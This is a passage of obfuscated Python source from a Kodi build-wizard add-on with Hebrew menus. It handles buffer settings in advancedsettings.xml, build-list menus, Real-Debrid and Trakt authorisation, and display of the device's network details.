	O00O0O0O0000O000O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0OO0O0O00O0O0OOO #line:1582
	return O00O0O0O0000O000O #line:1583
def xml_data_advSettings_New (O0OO00OO0OOOO00OO ):#line:1585
    OO0OO0O0O0O00OOO0 ="""<advancedsettings>
      <cache>
        <memorysize>%s</memorysize> 
        <buffermode>2</buffermode>
        <readfactor>2</readfactor>
      </cache>
    <video>
        <subsdelayrange>200</subsdelayrange>
    </video>
</advancedsettings>"""%O0OO00OO0OOOO00OO #line:1595
    return OO0OO0O0O0O00OOO0 #line:1596
def write_ADV_SETTINGS_XML (O000O00OOOO000000 ):#line:1597
    if not os .path .exists (xml_file ):#line:1598
        with open (xml_file ,"w")as O000OO0O000O0OOOO :#line:1599
            O000OO0O000O0OOOO .write (xml_data )#line:1600
def clean_buffer ():#line:1601
    O00OOO00000OO0O0O =xbmcgui .Dialog ()#line:1602
    OO00O000O0000OO0O =O00OOO00000OO0O0O .yesno (ADDONTITLE ,"האם למחוק את הגדרת הבאפר שלכם?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:1603
    if OO00O000O0000OO0O ==1 :#line:1604
        try :#line:1605
            os .remove (os .path .join (translatepath ("special://userdata/"),"advancedsettings.xml"))#line:1606
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Buffer'),'הגדרת הבאפר נמחקה')#line:1607
        except :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Buffer'),'אין קובץ באפר למחיקה')#line:1608
    else :#line:1609
     sys .exit ()#line:1610
def auto_buffer ():#line:1612
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'מגדיר באפר לפי נתוני מכשיר'),'אנא המתן...')#line:1613
    O0000O0OOO000O0OO =translatepath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1614
    OO0O0O00000000000 =xbmc .getInfoLabel ("System.Memory(total)")#line:1615
    OOO00O0O000OO0O00 =xbmc .getInfoLabel ("System.FreeMemory")#line:1616
    OOOO0000OOOO0O00O =re .sub ('[^0-9]','',OOO00O0O000OO0O00 )#line:1617
    OOOO0000OOOO0O00O =int (OOOO0000OOOO0O00O )/3 #line:1618
    OO0OOO0OO000000OO =OOOO0000OOOO0O00O *1024 *1024 #line:1620
    with open (O0000O0OOO000O0OO ,"w")as OO00OO0O0O0000000 :#line:1628
            OOOO00OOO0OO00O0O =xml_data_advSettings_New (str (OO0OOO0OO000000OO ))#line:1629
            OO00OO0O0O0000000 .write (OOOO00OOO0OO00O0O )#line:1630
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'זיכרון באפר שהוגדר'),str (int (OO0OOO0OO000000OO )))#line:1631
def auto_buffer_fromskin ():#line:1632
    OO0O0O0O00000OO0O =xbmcgui .Dialog ()#line:1633
    OOO00O000OOO00OOO =OO0O0O0O00000OO0O .yesno (ADDONTITLE ,"האם להגדיר באפר לפי נתוני המכשיר שלכם?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:1634
    if OOO00O000OOO00OOO ==1 :#line:1635
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'מגדיר באפר לפי נתוני מכשיר'),'אנא המתן...')#line:1636
        OOO00OO0000OOOO0O =translatepath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1637
        O0000O00OO00OO000 =xbmc .getInfoLabel ("System.Memory(total)")#line:1638
        OO00OO0OOOO00OOO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1639
        OOO0O0O0OO000OOO0 =re .sub ('[^0-9]','',OO00OO0OOOO00OOO0 )#line:1640
        OOO0O0O0OO000OOO0 =int (OOO0O0O0OO000OOO0 )/3 #line:1641
        O0000OO0O000OO000 =OOO0O0O0OO000OOO0 *1024 *1024 #line:1643
        with open (OOO00OO0000OOOO0O ,"w")as OO00O0000OO0O0O0O :#line:1651
                O0000O000O0O00000 =xml_data_advSettings_New (str (O0000OO0O000OO000 ))#line:1652
                OO00O0000OO0O0O0O .write (O0000O000O0O00000 )#line:1653
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'זיכרון באפר שהוגדר'),str (int (O0000OO0O000OO000 )))#line:1654
        resetkodi ()#line:1655
    else :#line:1656
     sys .exit ()#line:1657
def _O00000000O000000O (default ="",heading ="",hidden =False ):#line:1658
    ""#line:1659
    OO0O000000OO000OO =xbmc .Keyboard (default ,heading ,hidden )#line:1660
    OO0O000000OO000OO .doModal ()#line:1661
    if (OO0O000000OO000OO .isConfirmed ()):#line:1662
        return str (OO0O000000OO000OO .getText (),"utf-8")#line:1663
    return default #line:1664
def index ():#line:1666
	addFile ('קוד מכשיר: [COLOR yellow]%s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1667
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1696
	if os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:1697
		addFile ('עדכון מערכת','force_update',icon =ICONSAVE ,themeit =THEME1 )#line:1698
	addFile ('-----------------','',themeit =THEME3 )#line:1699
	addFile ('אימות חשבון','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1703
	if BUILDNAME =="":#line:1705
		addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1706
	else :#line:1707
		addDir ('התקנה מחדש','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1708
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1710
def firstinstall ():#line:1712
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1713
def morsetup ():#line:1716
	addDir ('התאמה למערכת הפעלה לינוקס','linux',icon =ICONSAVE ,themeit =THEME1 )#line:1717
	addDir ('התאם את טלמדיה לאנדרואיד 5','telemedia5',icon =ICONSAVE ,themeit =THEME1 )#line:1718
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1719
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1720
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:1721
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1722
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1723
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1727
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1728
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1731
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:1732
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:1733
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1734
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1744
	setView ('files','viewType')#line:1745
def morsetup2 ():#line:1746
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1747
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1748
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1749
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1750
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1751
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1752
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1753
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1754
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1755
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1756
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1757
def fastupdate ():#line:1758
    if os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:1759
        addFile ('עדכון מערכת','testnotify',themeit =THEME1 )#line:1760
def forcefastupdate ():#line:1762
			OOOO00O0O0O0O0O0O ="[COLOR %s]ברוכים הבאים לעדכון המערכת![/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1763
			wiz .ForceFastUpDate (ADDONTITLE ,OOOO00O0O0O0O0O0O )#line:1764
def rdsetup ():#line:1768
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:1769
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:1770
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:1772
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1773
def traktsetup ():#line:1776
	addFile ('[COLOR yellow]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1777
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1778
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1779
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1780
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1781
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1782
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1783
	setView ('files','viewType')#line:1784
def setautorealdebrid ():#line:1785
    from resources .libs import real_debrid #line:1786
    OO0O0O000OOOO0O0O =real_debrid .RealDebridFirst ()#line:1787
    OO0O0O000OOOO0O0O .auth ()#line:1788
def setrealdebrid ():#line:1790
    OO0OO0O00O0O0000O =(wiz .getS ("auto_rd"))#line:1791
    if OO0OO0O00O0O0000O =='false':#line:1792
       ADDON .openSettings ()#line:1793
    else :#line:1794
        from resources .libs import real_debrid #line:1795
        O0O000OO000O000OO =real_debrid .RealDebrid ()#line:1796
        O0O000OO000O000OO .auth ()#line:1797
        xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.mediasync/?mode=11&url=www)")#line:1800
        rdon ()#line:1801
def resolveurlsetup ():#line:1803
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1804
def urlresolversetup ():#line:1805
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1806
def placentasetup ():#line:1808
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1809
def reptiliasetup ():#line:1810
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1811
def flixnetsetup ():#line:1812
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1813
def yodasetup ():#line:1814
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1815
def numberssetup ():#line:1816
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1817
def uranussetup ():#line:1818
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1819
def genesissetup ():#line:1820
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1821
def net_tools (view =None ):#line:1823
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1824
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1825
	setView ('files','viewType')#line:1827
def speedMenu ():#line:1828
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1829
def viewIP ():#line:1830
	O00OO0OOO0OO0000O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1844
	O0OOO0O00OOO0000O =[];O00OO00000O000OO0 =0 #line:1845
	for O000000OO0O0OOO0O in O00OO0OOO0OO0000O :#line:1846
		O0O0O0O0O0OOOOO0O =wiz .getInfo (O000000OO0O0OOO0O )#line:1847
		O000OO0O00O000O0O =0 #line:1848
		while O0O0O0O0O0OOOOO0O =="Busy"and O000OO0O00O000O0O <10 :#line:1849
			O0O0O0O0O0OOOOO0O =wiz .getInfo (O000000OO0O0OOO0O );O000OO0O00O000O0O +=1 ;wiz .log ("%s sleep %s"%(O000000OO0O0OOO0O ,str (O000OO0O00O000O0O )));xbmc .sleep (1000 )#line:1850
		O0OOO0O00OOO0000O .append (O0O0O0O0O0OOOOO0O )#line:1851
		O00OO00000O000OO0 +=1 #line:1852
	O00O0OOO00OO00OO0 ,O000O00000OOO00OO ,O00OO00O00O00OOO0 =getIP ()#line:1853
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O00OOO0000O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1854
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OOO00OO00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1855
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00000OOO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1856
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO00O00O00OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1857
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O00OOO0000O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1858
	setView ('files','viewType')#line:1859
def buildMenu ():#line:1861
	if USERNAME ==''or PASSWORD =='':#line:1863
		ADDON .openSettings ()#line:1864
		if BUILDNAME =="":#line:1865
			xbmc .executebuiltin ("ActivateWindow(home)")#line:1866
		sys .exit ()#line:1867
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מאמת פרטים, אנא המתן...[/COLOR]'%COLOR2 )#line:1870
	check ()#line:1871
	O0OO00OOOO0O0OO00 =u_list (ld (BL ))#line:1872
	O00O0OO0O0OOO0OOO =wiz .workingURL (ld (BL ))#line:1875
	if not O00O0OO0O0OOO0OOO ==True :#line:1876
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1877
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1878
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1879
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1880
		addFile ('%s'%O00O0OO0O0OOO0OOO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1881
	else :#line:1882
		OO0OO00OOO0OO0OOO ,O0O0OOO000OO00OO0 ,OOO00O000000OOO00 ,OO000O0OO00OO0000 ,O00O000O00O00OO00 ,OO00O0O00000O0O00 ,O0O000O0O0O0O0OO0 =wiz .buildCount ()#line:1883
		OO00000OOOO00OO00 =False ;OOO000OO00O00OO00 =[]#line:1884
		if THIRDPARTY =='true':#line:1885
			if not THIRD1NAME ==''and not THIRD1URL =='':OO00000OOOO00OO00 =True ;OOO000OO00O00OO00 .append ('1')#line:1886
			if not THIRD2NAME ==''and not THIRD2URL =='':OO00000OOOO00OO00 =True ;OOO000OO00O00OO00 .append ('2')#line:1887
			if not THIRD3NAME ==''and not THIRD3URL =='':OO00000OOOO00OO00 =True ;OOO000OO00O00OO00 .append ('3')#line:1888
		OOOOO0O0OO00OO00O =wiz .openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1889
		OO0OOO000O0O00000 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO0O0OO00OO00O )#line:1890
		if OO0OO00OOO0OO0OOO ==1 and OO00000OOOO00OO00 ==False :#line:1891
			for O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ,OOO00OO0000OOOO00 ,O0OO0OO0O0OO00OOO ,O0OOOOOOO0OOOO000 ,OOOO000O00000O0OO ,OOOOO0O0O0OOOOOOO ,O0OO0OO0OOO00OO00 ,O0O0OOO0O00OO00OO ,O00OO00OO00OO00OO in OO0OOO000O0O00000 :#line:1892
				if not SHOWADULT =='true'and O0O0OOO0O00OO00OO .lower ()=='yes':continue #line:1893
				if not DEVELOPER =='true'and wiz .strTest (O0O00OOOOOO0OOO0O ):continue #line:1894
				viewBuild (OO0OOO000O0O00000 [0 ][0 ])#line:1895
				return #line:1896
		if os .path .exists (translatepath ("special://home/addons/")+'skin.Premium.mod'):#line:1899
			addFile ('עדכון מערכת','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1900
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1901
		if OO00000OOOO00OO00 ==True :#line:1902
			for OOOO0OO0OO00OOOOO in OOO000OO00O00OO00 :#line:1903
				O0O00OOOOOO0OOO0O =eval ('THIRD%sNAME'%OOOO0OO0OO00OOOOO )#line:1904
		if len (OO0OOO000O0O00000 )>=1 :#line:1906
			if SEPERATE =='true':#line:1907
				for O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ,OOO00OO0000OOOO00 ,O0OO0OO0O0OO00OOO ,O0OOOOOOO0OOOO000 ,OOOO000O00000O0OO ,OOOOO0O0O0OOOOOOO ,O0OO0OO0OOO00OO00 ,O0O0OOO0O00OO00OO ,O00OO00OO00OO00OO in OO0OOO000O0O00000 :#line:1908
					if not SHOWADULT =='true'and O0O0OOO0O00OO00OO .lower ()=='yes':continue #line:1909
					if not DEVELOPER =='true'and wiz .strTest (O0O00OOOOOO0OOO0O ):continue #line:1910
					OO0O0O0O0O000OO0O =createMenu ('install','',O0O00OOOOOO0OOO0O )#line:1911
					addDir ('[%s] %s (v%s)'%(float (O0OOOOOOO0OOOO000 ),O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ),'viewbuild',O0O00OOOOOO0OOO0O ,description =O00OO00OO00OO00OO ,fanart =O0OO0OO0OOO00OO00 ,icon =OOOOO0O0O0OOOOOOO ,menu =OO0O0O0O0O000OO0O ,themeit =THEME2 )#line:1912
			else :#line:1913
				if OO000O0OO00OO0000 >0 :#line:1914
					OOOOO00000000O0O0 ='+'if SHOW17 =='false'else '-'#line:1915
					if SHOW17 =='true':#line:1917
						for O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ,OOO00OO0000OOOO00 ,O0OO0OO0O0OO00OOO ,O0OOOOOOO0OOOO000 ,OOOO000O00000O0OO ,OOOOO0O0O0OOOOOOO ,O0OO0OO0OOO00OO00 ,O0O0OOO0O00OO00OO ,O00OO00OO00OO00OO in OO0OOO000O0O00000 :#line:1919
							if not SHOWADULT =='true'and O0O0OOO0O00OO00OO .lower ()=='yes':continue #line:1920
							if not DEVELOPER =='true'and wiz .strTest (O0O00OOOOOO0OOO0O ):continue #line:1921
							O000OO000OO00OOO0 =int (float (O0OOOOOOO0OOOO000 ))#line:1922
							if O000OO000OO00OOO0 ==17 :#line:1923
								OO0O0O0O0O000OO0O =createMenu ('install','',O0O00OOOOOO0OOO0O )#line:1924
								addDir ('[%s] %s (v%s)'%(float (O0OOOOOOO0OOOO000 ),O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ),'viewbuild',O0O00OOOOOO0OOO0O ,description =O00OO00OO00OO00OO ,fanart =O0OO0OO0OOO00OO00 ,icon =OOOOO0O0O0OOOOOOO ,menu =OO0O0O0O0O000OO0O ,themeit =THEME2 )#line:1925
				if O00O000O00O00OO00 >0 :#line:1926
					OOOOO00000000O0O0 ='+'if SHOW18 =='false'else '-'#line:1927
					if SHOW18 =='true':#line:1929
						for O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ,OOO00OO0000OOOO00 ,O0OO0OO0O0OO00OOO ,O0OOOOOOO0OOOO000 ,OOOO000O00000O0OO ,OOOOO0O0O0OOOOOOO ,O0OO0OO0OOO00OO00 ,O0O0OOO0O00OO00OO ,O00OO00OO00OO00OO in OO0OOO000O0O00000 :#line:1931
							if not SHOWADULT =='true'and O0O0OOO0O00OO00OO .lower ()=='yes':continue #line:1932
							if not DEVELOPER =='true'and wiz .strTest (O0O00OOOOOO0OOO0O ):continue #line:1933
							O000OO000OO00OOO0 =int (float (O0OOOOOOO0OOOO000 ))#line:1934
							if O000OO000OO00OOO0 ==18 :#line:1935
								OO0O0O0O0O000OO0O =createMenu ('install','',O0O00OOOOOO0OOO0O )#line:1936
								addDir ('[%s] %s (v%s)'%(float (O0OOOOOOO0OOOO000 ),O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ),'viewbuild',O0O00OOOOOO0OOO0O ,description =O00OO00OO00OO00OO ,fanart =O0OO0OO0OOO00OO00 ,icon =OOOOO0O0O0OOOOOOO ,menu =OO0O0O0O0O000OO0O ,themeit =THEME2 )#line:1937
				if OOO00O000000OOO00 >0 :#line:1938
					OOOOO00000000O0O0 ='+'if SHOW16 =='false'else '-'#line:1939
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOOO00000000O0O0 ,OOO00O000000OOO00 ),'togglesetting','show16',themeit =THEME3 )#line:1940
					if SHOW16 =='true':#line:1941
						for O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ,OOO00OO0000OOOO00 ,O0OO0OO0O0OO00OOO ,O0OOOOOOO0OOOO000 ,OOOO000O00000O0OO ,OOOOO0O0O0OOOOOOO ,O0OO0OO0OOO00OO00 ,O0O0OOO0O00OO00OO ,O00OO00OO00OO00OO in OO0OOO000O0O00000 :#line:1942
							if not SHOWADULT =='true'and O0O0OOO0O00OO00OO .lower ()=='yes':continue #line:1943
							if not DEVELOPER =='true'and wiz .strTest (O0O00OOOOOO0OOO0O ):continue #line:1944
							O000OO000OO00OOO0 =int (float (O0OOOOOOO0OOOO000 ))#line:1945
							if O000OO000OO00OOO0 ==16 :#line:1946
								OO0O0O0O0O000OO0O =createMenu ('install','',O0O00OOOOOO0OOO0O )#line:1947
								addDir ('[%s] %s (v%s)'%(float (O0OOOOOOO0OOOO000 ),O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ),'viewbuild',O0O00OOOOOO0OOO0O ,description =O00OO00OO00OO00OO ,fanart =O0OO0OO0OOO00OO00 ,icon =OOOOO0O0O0OOOOOOO ,menu =OO0O0O0O0O000OO0O ,themeit =THEME2 )#line:1948
				if O0O0OOO000OO00OO0 >0 :#line:1949
					OOOOO00000000O0O0 ='+'if SHOW15 =='false'else '-'#line:1950
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOOO00000000O0O0 ,O0O0OOO000OO00OO0 ),'togglesetting','show15',themeit =THEME3 )#line:1951
					if SHOW15 =='true':#line:1952
						for O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ,OOO00OO0000OOOO00 ,O0OO0OO0O0OO00OOO ,O0OOOOOOO0OOOO000 ,OOOO000O00000O0OO ,OOOOO0O0O0OOOOOOO ,O0OO0OO0OOO00OO00 ,O0O0OOO0O00OO00OO ,O00OO00OO00OO00OO in OO0OOO000O0O00000 :#line:1953
							if not SHOWADULT =='true'and O0O0OOO0O00OO00OO .lower ()=='yes':continue #line:1954
							if not DEVELOPER =='true'and wiz .strTest (O0O00OOOOOO0OOO0O ):continue #line:1955
							O000OO000OO00OOO0 =int (float (O0OOOOOOO0OOOO000 ))#line:1956
							if O000OO000OO00OOO0 <=15 :#line:1957
								OO0O0O0O0O000OO0O =createMenu ('install','',O0O00OOOOOO0OOO0O )#line:1958
								addDir ('[%s] %s (v%s)'%(float (O0OOOOOOO0OOOO000 ),O0O00OOOOOO0OOO0O ,OOO0OO00O0O0O000O ),'viewbuild',O0O00OOOOOO0OOO0O ,description =O00OO00OO00OO00OO ,fanart =O0OO0OO0OOO00OO00 ,icon =OOOOO0O0O0OOOOOOO ,menu =OO0O0O0O0O000OO0O ,themeit =THEME2 )#line:1959
		elif O0O000O0O0O0O0OO0 >0 :#line:1960
			if OO00O0O00000O0O00 >0 :#line:1961
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:1962
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:1963
			else :#line:1964
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1965
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:1966
	setView ('files','viewType')#line:1967
def viewBuild (OO00OOOO00OOO00OO ):#line:1976
    OO00OO0O0O0OO000O =wiz .workingURL (ld (BL ))#line:1983
    if not OO00OO0O0O0OO000O ==True :#line:1984
        addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:1985
        addFile ('%s'%OO00OO0O0O0OO000O ,'',themeit =THEME3 )#line:1986
        return #line:1987
    if wiz .checkBuild (OO00OOOO00OOO00OO ,'version')==False :#line:1988
        addFile ('Error reading the txt file.','',themeit =THEME3 )#line:1989
        addFile ('%s was not found in the builds list.'%OO00OOOO00OOO00OO ,'',themeit =THEME3 )#line:1990
        return #line:1991
    O0OO0OO00O00OOOO0 =wiz .openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:1992
    OOOO00OOO00OOO0O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00OOOO00OOO00OO ).findall (O0OO0OO00O00OOOO0 )#line:1993
    for OO000O0000O0OO0OO ,OO0OOOOOO0OO0O0O0 ,O0OO0O0O0O00O0OOO ,OOOO00000O0O0OO00 ,O0O0000OO0OO0O0OO ,O00O000O0OO0O0000 ,O0O0O0O00OO000OO0 ,OO00000O00000OO0O ,O0O0O0OO0OO00O0OO ,OO0O0O0000OOO0O0O in OOOO00OOO00OOO0O0 :#line:1994
        O00O000O0OO0O0000 =O00O000O0OO0O0000 if wiz .workingURL (O00O000O0OO0O0000 )else ICON #line:1996
        O0O0O0O00OO000OO0 =O0O0O0O00OO000OO0 if wiz .workingURL (O0O0O0O00OO000OO0 )else FANART #line:1997
        OO0OO0000O00O0000 ='%s (v%s)'%(OO00OOOO00OOO00OO ,OO000O0000O0OO0OO )#line:1998
        if BUILDNAME ==OO00OOOO00OOO00OO and OO000O0000O0OO0OO >BUILDVERSION :#line:1999
            OO0OO0000O00O0000 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0OO0000O00O0000 ,BUILDVERSION )#line:2000
        OO00O0000000O0OOO =int (float (KODIV ));OO000OO0O00OOOOO0 =int (float (OOOO00000O0O0OO00 ))#line:2009
        if not OO00O0000000O0OOO ==OO000OO0O00OOOOO0 :#line:2010
            if OO00O0000000O0OOO ==16 and OO000OO0O00OOOOO0 <=15 :OO00OO00000OOO0OO =False #line:2011
            else :OO00OO00000OOO0OO =True #line:2012
        else :OO00OO00000OOO0OO =False #line:2013
